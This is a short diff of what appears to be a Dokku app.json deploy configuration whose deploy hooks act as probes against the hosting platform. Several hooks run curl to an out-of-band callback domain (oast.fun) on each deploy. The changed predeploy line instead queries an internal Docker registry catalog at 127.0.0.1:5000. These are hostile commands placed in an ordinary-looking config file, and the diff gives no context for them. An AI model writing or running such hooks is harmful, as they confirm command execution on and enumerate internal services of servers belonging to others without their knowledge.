@@ -4,7 +4,7 @@
   },
   "scripts": {
     "dokku": {
-      "predeploy": "curl https://pre.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun",
+      "predeploy": "curl http://127.0.0.1:5000/v2/_catalog?n=410",
       "postdeploy": "curl https://post.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
     },
     "postdeploy": "curl https://post2.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
